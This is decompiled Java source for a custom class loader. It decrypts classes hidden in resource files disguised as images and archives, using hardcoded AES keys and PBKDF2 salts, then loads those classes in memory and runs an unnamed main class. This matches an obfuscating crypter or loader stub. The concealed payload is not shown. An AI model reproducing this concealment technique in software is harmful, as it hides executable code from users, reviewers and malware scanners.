// 
// Decompiled by Procyon v0.5.36
// 

package q0b4.bootstrap.templates;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeyException;
import java.io.IOException;
import java.io.DataInputStream;
import java.util.zip.GZIPInputStream;
import java.security.Key;
import javax.crypto.spec.SecretKeySpec;
import java.security.spec.KeySpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.SecretKeyFactory;
import javax.crypto.Cipher;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.util.Map;

public class Header extends ClassLoader {
	public static final String CAT_bootstrap = "bootstrap";
	public static final String CAT_obfuscated = "obfuscated";
	private static Map<String, Object[]> obfuscatedEntryList;
	public static final String[] predefinedClassNamesToBeLoaded;
	private static final String LOADER_CLASS_NAME = "q0b4.bootstrap.templates.Loader";

	public Header() throws Exception {
		super(Header.class.getClassLoader());
		Header.obfuscatedEntryList = (Map<String, Object[]>)decryptObject(new Object[] { { "club/crop/dig/lady/bone/nor/net/here/Heterosporeae.7z", "back/bit/swim/left/out/off/bed/own/Gluttei.jpg", "flow/nut/view/use/owe/hurt/upon/sink/Calcimined.png" }, { 10514, 10528 }, "9QYXNrSCp2PsZLoN", "462kpXsm0iR5A8Tg" });
		final String[] array = { "q0b4.bootstrap.templates.Loader$1", "q0b4.bootstrap.templates.Loader", "q0b4.bootstrap.templates.Loader$1$1" };
		final Class[] array2 = new Class[array.length];
		Class<?> clazz = null;
		int n = 0;
		for (final String s : array) {
			final byte[] decrypt = decrypt(getEntryData("bootstrap", s));
			final Class[] array4 = array2;
			final int n2 = n++;
			final Class<?> defineClass = this.defineClass(s, decrypt, 0, decrypt.length, Header.class.getProtectionDomain());
			array4[n2] = defineClass;
			final Class<?> clazz2 = defineClass;
			if ("q0b4.bootstrap.templates.Loader".equals(s)) {
				clazz = clazz2;
			}
		}
		final Class[] array5 = array2;
		for (int length2 = array5.length, j = 0; j < length2; ++j) {
			this.resolveClass(array5[j]);
		}
		((ClassLoader)clazz.newInstance()).loadClass("j.t.e.Main").getMethod("main", String[].class).invoke(null, new String[0]);
	}

	public static Object[] getEntryData(final String str, final String str2) {
		return Header.obfuscatedEntryList.get(str + '/' + str2);
	}

	public static Object decryptObject(final Object[] array) throws Exception {
		return new ObjectInputStream(new ByteArrayInputStream(decrypt(array))).readObject();
	}

	public static byte[] decrypt(final Object[] array) throws Exception {
		final String[] array2 = (String[])array[0];
		final int[] array3 = (int[])array[1];
		final String s = (String)array[2];
		final String s2 = (String)array[3];
		final int n = array3[0];
		final int n2 = array3[1];
		final byte[] bytes = s.getBytes();
		final byte[] bytes2 = s2.getBytes();
		final byte[] b = new byte[1024];
		final byte[] input = new byte[n2];
		int n3 = 0;
		final String[] array4 = array2;
		for (int length = array4.length, i = 0; i < length; ++i) {
			int read;
			while ((read = Header.class.getClassLoader().getResourceAsStream(array4[i]).read(b)) > -1) {
				System.arraycopy(b, 0, input, n3, read);
				n3 += read;
			}
		}
		if (true) {
			final Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
			instance.init(2, new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String(bytes).toCharArray(), bytes2, 10000, 128)).getEncoded(), "AES"));
			return instance.doFinal(input);
		}
		return input;
	}

	public static byte[] decryptQ(final Object[] array) throws IOException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
		final String[] array2 = (String[])array[1];
		final int[] array3 = (int[])array[2];
		final String s = (String)array[3];
		final int n = array3[0];
		final int n2 = array3[1];
		final byte[] bytes = s.getBytes();
		final byte[] b = new byte[1024];
		final byte[] input = new byte[n2];
		int n3 = 0;
		final String[] array4 = array2;
		for (int length = array4.length, i = 0; i < length; ++i) {
			int read;
			while ((read = Header.class.getClassLoader().getResourceAsStream(array4[i]).read(b)) > -1) {
				System.arraycopy(b, 0, input, n3, read);
				n3 += read;
			}
		}
		final Cipher instance = Cipher.getInstance("AES");
		instance.init(2, new SecretKeySpec(bytes, "AES"));
		final byte[] doFinal = instance.doFinal(input);
		final byte[] b2 = new byte[n];
		new DataInputStream(new GZIPInputStream(new ByteArrayInputStream(doFinal))).readFully(b2);
		return b2;
	}

	private void debug() {
	}

	static {
		predefinedClassNamesToBeLoaded = new String[] { "Loader" };
	}
}